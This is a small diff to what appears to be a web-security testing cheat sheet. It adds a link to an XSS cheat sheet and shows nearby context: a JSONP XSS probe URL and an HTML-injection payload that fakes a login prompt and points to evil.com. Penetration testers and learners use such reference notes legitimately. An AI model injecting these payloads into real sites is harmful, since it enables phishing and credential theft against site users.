@@ -105,6 +105,7 @@ To analyze the schema: [vangoncharov.github.io/graphql-voyager/](https://ivangon
 - https://www.googleapis.com/customsearch/v1?callback=alert(document.domain)
 - [JSFuck](http://www.jsfuck.com/)
 - [Path Relative style sheet injection](https://portswigger.net/kb/issues/00200328_path-relative-style-sheet-import)
+- [Cross-site scripting (XSS) cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
 
 **Payloads**
 - HTML inj `<p style="color:red">ERROR! Repeat the login</p>Membership No.<br/><input><br/><a href=http://evil.com><br><input type=button value="Login"></a><br/><img src=http://evil.com style="visibility:hidden">`
